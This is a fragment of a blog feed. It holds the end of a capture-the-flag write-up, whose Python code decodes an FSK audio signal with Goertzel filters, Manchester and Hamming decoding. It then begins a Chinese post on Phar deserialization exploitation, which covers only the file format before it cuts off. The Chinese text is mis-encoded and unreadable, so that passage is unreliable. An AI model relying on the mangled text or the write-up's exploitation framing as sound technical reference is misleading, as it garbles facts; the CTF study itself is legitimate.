class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Goertzel</span>():</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, rate, freq</span>):</span><br><span class=\"line\">        self.normalize = <span class=\"number\">0</span></span><br><span class=\"line\">        self.coeffs = <span class=\"number\">0</span></span><br><span class=\"line\">        self.sample_rate = rate</span><br><span class=\"line\">        self.target_freq = freq</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">calculate_coeff</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        Precompute coefficients needed for filter equation.</span></span><br><span class=\"line\"><span class=\"string\">        Coeff formulas courtesy of Prof. Massey</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        n = <span class=\"number\">160</span></span><br><span class=\"line\"></span><br><span class=\"line\">        w0 = (<span class=\"number\">2</span> * np.pi * self.target_freq) / self.sample_rate</span><br><span class=\"line\">        self.normalize = np.exp(<span class=\"number\">1j</span> * w0 * n)</span><br><span class=\"line\">        self.coeffs = np.array([np.exp((-<span class=\"number\">1j</span>) * w0 * k) <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n)])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">filter</span>(<span class=\"params\">self, samples</span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        Goertzel filter equation</span></span><br><span class=\"line\"><span class=\"string\">        :param samples: array of samples</span></span><br><span class=\"line\"><span class=\"string\">        :returns: amplitude</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        y = self.normalize * <span class=\"number\">160</span> * np.dot(self.coeffs, samples)</span><br><span class=\"line\">        ampl = np.<span class=\"built_in\">abs</span>(y)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ampl</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># decode.py</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">Decode a wav file using a Goertzel filter.</span></span><br><span class=\"line\"><span class=\"string\">Modified from https://github.com/laurenschneider/audiodecoder</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> goertzel <span class=\"keyword\">import</span> Goertzel</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> scipy.io <span class=\"keyword\">import</span> wavfile</span><br><span class=\"line\"></span><br><span class=\"line\">DATA = os.path.dirname(os.path.abspath(__file__))</span><br><span class=\"line\">filepath = os.path.join(DATA, <span class=\"string\">&quot;filename.wav&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Read sample rate and data from audio file</span></span><br><span class=\"line\">rate, data = wavfile.read(filepath)</span><br><span class=\"line\"></span><br><span class=\"line\">message = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">bit_string = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">mark_freq = <span class=\"number\">2225</span></span><br><span class=\"line\">space_freq = <span class=\"number\">2025</span></span><br><span class=\"line\">mark_filter = Goertzel(rate, mark_freq)</span><br><span class=\"line\">space_filter = Goertzel(rate, space_freq)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># calculate coefficients for each filter</span></span><br><span class=\"line\">mark_filter.calculate_coeff()</span><br><span class=\"line\">space_filter.calculate_coeff()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(data.size + <span class=\"number\">1</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># for each chunk of 160 samples</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> i%<span class=\"number\">160</span> == <span class=\"number\">0</span> <span class=\"keyword\">and</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">        start = i - <span class=\"number\">160</span></span><br><span class=\"line\">        end = i</span><br><span class=\"line\">        samples = data[start:end]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># get amplitutes of sample set</span></span><br><span class=\"line\">        mark_amp = mark_filter.<span class=\"built_in\">filter</span>(samples)</span><br><span class=\"line\">        space_amp = space_filter.<span class=\"built_in\">filter</span>(samples)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mark_amp &gt; space_amp:</span><br><span class=\"line\">            <span class=\"comment\"># bit is 1</span></span><br><span class=\"line\">            to_add = <span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># bit is zero</span></span><br><span class=\"line\">            to_add = <span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">        bit_string = to_add + bit_string</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>, <span class=\"built_in\">len</span>(bit_string)+<span class=\"number\">10</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x%<span class=\"number\">10</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        start = x - <span class=\"number\">9</span></span><br><span class=\"line\">        end = x - <span class=\"number\">1</span></span><br><span class=\"line\">        message = <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(bit_string[start:end],<span class=\"number\">2</span>)) + message</span><br><span class=\"line\"><span class=\"built_in\">print</span>(message)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># set target frequencies</span></span><br><span class=\"line\">mark_freq = <span class=\"number\">1270</span></span><br><span class=\"line\">space_freq = <span class=\"number\">1070</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># create two filters</span></span><br><span class=\"line\">mark_filter = Goertzel(rate, mark_freq)</span><br><span class=\"line\">space_filter = Goertzel(rate, space_freq)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># calculate coefficients for each filter</span></span><br><span class=\"line\">mark_filter.calculate_coeff()</span><br><span class=\"line\">space_filter.calculate_coeff()</span><br><span class=\"line\"></span><br><span class=\"line\">bit_string = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">message = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(data.size + <span class=\"number\">1</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># for each chunk of 160 samples</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> i%<span class=\"number\">160</span> == <span class=\"number\">0</span> <span class=\"keyword\">and</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">        start = i - <span class=\"number\">160</span></span><br><span class=\"line\">        end = i</span><br><span class=\"line\">        samples = data[start:end]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># get amplitutes of sample set</span></span><br><span class=\"line\">        mark_amp = mark_filter.<span class=\"built_in\">filter</span>(samples)</span><br><span class=\"line\">        space_amp = space_filter.<span class=\"built_in\">filter</span>(samples)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mark_amp &gt; space_amp:</span><br><span class=\"line\">            to_add = <span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            to_add = <span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">        bit_string = to_add + bit_string</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">HammingBolck</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span>(<span class=\"built_in\">len</span>(message)==<span class=\"number\">15</span>)</span><br><span class=\"line\">    message=message[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">    code = <span class=\"number\">0</span></span><br><span class=\"line\">    m_pos = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ind+<span class=\"number\">1</span>)&amp;(ind): <span class=\"comment\"># Not parity check bit</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">int</span>(message[m_pos],<span class=\"number\">2</span>):</span><br><span class=\"line\">                code = code ^ (<span class=\"number\">1</span>&lt;&lt;ind)</span><br><span class=\"line\">                code = code ^ (((ind+<span class=\"number\">1</span>)&amp;<span class=\"number\">0b1</span>)&lt;&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">                code = code ^ (((ind+<span class=\"number\">1</span>)&amp;<span class=\"number\">0b10</span>)&lt;&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">                code = code ^ (((ind+<span class=\"number\">1</span>)&amp;<span class=\"number\">0b100</span>)&lt;&lt;<span class=\"number\">1</span>)</span><br><span class=\"line\">                code = code ^ (((ind+<span class=\"number\">1</span>)&amp;<span class=\"number\">0b1000</span>)&lt;&lt;<span class=\"number\">4</span>)</span><br><span class=\"line\">            m_pos = m_pos + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    code = code ^ (<span class=\"number\">1</span>&lt;&lt;random.randint(<span class=\"number\">0</span>,<span class=\"number\">19</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&#123;0:020b&#125;&quot;</span>.<span class=\"built_in\">format</span>(code)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;from &quot;</span>+message+<span class=\"string\">&quot; to &quot;</span>+retStr)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">HammingBolckInv</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span>(<span class=\"built_in\">len</span>(message)==<span class=\"number\">20</span>)</span><br><span class=\"line\">    code = <span class=\"built_in\">int</span>(message,<span class=\"number\">2</span>)</span><br><span class=\"line\">    wrong = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">1</span>&lt;&lt;ind)&amp;code:</span><br><span class=\"line\">            wrong = wrong ^ (ind+<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> wrong:</span><br><span class=\"line\">        code = code ^ (<span class=\"number\">1</span>&lt;&lt;(wrong-<span class=\"number\">1</span>))</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ind+<span class=\"number\">1</span>)&amp;(ind): <span class=\"comment\"># Not parity check bit</span></span><br><span class=\"line\">            retStr = retStr + (<span class=\"string\">&quot;1&quot;</span> <span class=\"keyword\">if</span> code&amp;(<span class=\"number\">1</span>&lt;&lt;ind) <span class=\"keyword\">else</span> <span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Hamming</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(message),<span class=\"number\">15</span>):</span><br><span class=\"line\">        retStr = retStr + HammingBolck(message[ind:ind+<span class=\"number\">15</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">HammingInv</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(message),<span class=\"number\">20</span>):</span><br><span class=\"line\">        retStr = retStr + HammingBolckInv(message[ind:ind+<span class=\"number\">20</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manchester</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> message:</span><br><span class=\"line\">        retStr += <span class=\"string\">&quot;01&quot;</span> <span class=\"keyword\">if</span> char==<span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">else</span> <span class=\"string\">&quot;10&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manchesterInv</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(message), <span class=\"number\">2</span>):</span><br><span class=\"line\">        char = message[ind]</span><br><span class=\"line\">        retStr += <span class=\"string\">&quot;0&quot;</span> <span class=\"keyword\">if</span> char==<span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">else</span> <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"></span><br><span class=\"line\">bit_string=bit_string[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">bit_string = HammingInv(manchesterInv(bit_string))[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>, <span class=\"built_in\">len</span>(bit_string)+<span class=\"number\">10</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x%<span class=\"number\">10</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        start = x - <span class=\"number\">9</span></span><br><span class=\"line\">        end = x - <span class=\"number\">1</span></span><br><span class=\"line\">        message = <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(bit_string[start:end],<span class=\"number\">2</span>)) + message</span><br><span class=\"line\"><span class=\"built_in\">print</span>(message)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"7-Final-Words\"><a href=\"#7-Final-Words\" class=\"headerlink\" title=\"7. Final Words\"></a>7. Final Words</h3><p>In my eyes, a good misc problem should not be an annoying puzzle. Steps to solve a misc problem have to be reasonable. For example, in this problem, Manchester coding is applied after the application of Hamming coding: thatâ€™s because the former is channel coding, and the latter is source coding. We shouldnâ€™t just pick some random encryption and apply it to plaintext.</p>\n<p> I have made my best to make the solving process more natural. I hope you enjoy digging deep into the problem. Youâ€™ll earn much more fun than those who can just use tools written by others without understanding fundamental principles (like me).</p>\n<p>ã”æ­¦é‹ã‚’ï¼</p>\n",
            "tags": [
                "Write-Up",
                "Misc",
                "å‡ºé¢˜",
                "English"
            ]
        },
        {
            "id": "http://cubicy.icu/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/",
            "url": "http://cubicy.icu/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/",
            "title": "æµ…è°ˆPharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ï¼šN1CTF 2021 easyphp & å®‰æ´µæ¯2021 EZ_TP",
            "date_published": "2021-11-28T05:35:00.000Z",
            "content_html": "<h1 id=\"Phar\"><a href=\"#Phar\" class=\"headerlink\" title=\"Phar\"></a>Phar</h1><h2 id=\"ä»€ä¹ˆæ˜¯Phar\"><a href=\"#ä»€ä¹ˆæ˜¯Phar\" class=\"headerlink\" title=\"ä»€ä¹ˆæ˜¯Phar\"></a>ä»€ä¹ˆæ˜¯Phar</h2><blockquote>\n<p>PHp ARchive, like a Java JAR, but for PHP.</p>\n</blockquote>\n<p>pharï¼ˆPHp ARchiveï¼‰æ˜¯ç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ã€‚PHP â‰¥5.3å¯¹Pharåç¼€æ–‡ä»¶æ˜¯é»˜è®¤å¼€å¯æ”¯æŒçš„ï¼Œä¸éœ€è¦ä»»ä½•å…¶ä»–çš„å®‰è£…å°±å¯ä»¥ä½¿ç”¨å®ƒã€‚</p>\n<blockquote>\n<p>pharæ‰©å±•æä¾›äº†ä¸€ç§å°†æ•´ä¸ªPHPåº”ç”¨ç¨‹åºæ”¾å…¥.pharæ–‡ä»¶ä¸­çš„æ–¹æ³•ï¼Œä»¥æ–¹ä¾¿ç§»åŠ¨ã€å®‰è£…ã€‚.pharæ–‡ä»¶çš„æœ€å¤§ç‰¹ç‚¹æ˜¯å°†å‡ ä¸ªæ–‡ä»¶ç»„åˆæˆä¸€ä¸ªæ–‡ä»¶çš„ä¾¿æ·æ–¹å¼ï¼Œ.pharæ–‡ä»¶æä¾›äº†ä¸€ç§å°†å®Œæ•´çš„PHPç¨‹åºåˆ†å¸ƒåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶ä¸­è¿è¡Œçš„æ–¹æ³•ã€‚</p>\n</blockquote>\n<p>è¯´ç™½äº†ï¼Œå°±æ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œä½†æ˜¯ä¸æ­¢èƒ½æ”¾å‹ç¼©æ–‡ä»¶è¿›å»ã€‚</p>\n<p>åœ¨åšè¿›ä¸€æ­¥æ¢ç©¶ä¹‹å‰éœ€è¦å…ˆè°ƒæ•´é…ç½®ï¼Œå› ä¸ºå¯¹äºPharæ–‡ä»¶çš„ç›¸å…³æ“ä½œï¼Œphpç¼ºçœçŠ¶æ€æ˜¯åªè¯»çš„ï¼ˆä¹Ÿå°±æ˜¯è¯´å•çº¯ä½¿ç”¨Pharæ–‡ä»¶ä¸éœ€è¦ä»»ä½•çš„è°ƒæ•´é…ç½®ï¼‰ã€‚ä½†æ˜¯å› ä¸ºæˆ‘ä»¬ç°åœ¨éœ€è¦åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„Pharæ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦å…è®¸å†™å…¥Pharæ–‡ä»¶ï¼Œè¿™éœ€è¦ä¿®æ”¹ä¸€ä¸‹Â <code>php.ini</code></p>\n<p>æ‰“å¼€Â <code>php.ini</code>ï¼Œæ‰¾åˆ°Â <code>phar.readonly</code>Â æŒ‡ä»¤è¡Œï¼Œä¿®æ”¹æˆï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">phar.<span class=\"keyword\">readonly</span> = <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<p>å³å¯ã€‚</p>\n<hr>\n<h2 id=\"Pharæ–‡ä»¶æ ¼å¼\"><a href=\"#Pharæ–‡ä»¶æ ¼å¼\" class=\"headerlink\" title=\"Pharæ–‡ä»¶æ ¼å¼\"></a>Pharæ–‡ä»¶æ ¼å¼</h2><p>Pharæ–‡ä»¶ç”±å››éƒ¨åˆ†ç»„æˆï¼š</p>\n<p><strong>1.stub</strong></p>\n<p>stubæ˜¯pharæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œæ ¼å¼ä¸º<code>xxxxxx&lt;?php ...;__HALT_COMPILER();?&gt;</code>ï¼Œxxxxxxå¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼ŒåŒ…æ‹¬ç•™ç©ºï¼Œä¸”phpé—­åˆç¬¦ä¸æœ€åä¸€ä¸ªåˆ†å·ä¹‹é—´ä¸èƒ½æœ‰å¤šäºä¸€ä¸ªçš„ç©ºæ ¼ç¬¦ã€‚å¦å¤–phpé—­åˆç¬¦ä¹Ÿå¯çœç•¥ã€‚</p>\n<p><strong>2.manifest describing the contents</strong></p>\n<p>è¯¥åŒºåŸŸå­˜æ”¾pharåŒ…çš„å±æ€§ä¿¡æ¯ï¼Œå…è®¸æ¯ä¸ªæ–‡ä»¶æŒ‡å®šæ–‡ä»¶å‹ç¼©ã€æ–‡ä»¶æƒé™ï¼Œç”šè‡³æ˜¯ç”¨æˆ·å®šä¹‰çš„å…ƒæ•°æ®ï¼Œå¦‚æ–‡ä»¶ç”¨æˆ·æˆ–ç»„ã€‚</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/format.png\" loading=\"lazy\"></p>\n<p>è¿™é‡Œé¢çš„metadataä»¥serializeå½¢å¼å‚¨å­˜ï¼Œä¸ºååºåˆ—åŒ–æ¼æ´åŸ‹ä¸‹äº†ä¼ç¬”ã€‚</p>\n<p><strong>3.file contents</strong></p>\n<p>è¢«å‹ç¼©çš„ç”¨æˆ·æ·»åŠ çš„æ–‡ä»¶å†…å®¹</p>\n<p>4.<strong>signature</strong></p>\n<p>å¯é€‰ï¼Œpharæ–‡ä»¶çš„ç­¾åï¼Œå…è®¸çš„æœ‰MD5, SHA1, SHA256, SHA512å’ŒOPENSSL.</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/signature.png\" alt=\"signature\" loading=\"lazy\"></p>\n<p>è¿™éƒ¨åˆ†ä»¥<code>GBMB</code>ï¼ˆ47 42 4d 42ï¼‰ç»“å°¾ã€‚</p>\n<p>éœ€è¦æ³¨æ„ï¼Œstubä¸ä¸€å®šè¦åœ¨æ–‡ä»¶å¼€å¤´ã€‚</p>\n<h2 id=\"åˆ©ç”¨æ–¹å¼\"><a href=\"#åˆ©ç”¨æ–¹å¼\" class=\"headerlink\" title=\"åˆ©ç”¨æ–¹å¼\"></a>åˆ©ç”¨æ–¹å¼</h2><p>åœ¨2018 Black Hatä¸Šï¼Œå®‰å…¨ç ”ç©¶å‘˜<code>Sam Thomas</code>åˆ†äº«äº†è®®é¢˜<code>Itâ€™s a PHP unserialization vulnerability Jim, but not as we know it</code> .</p>\n<p><a 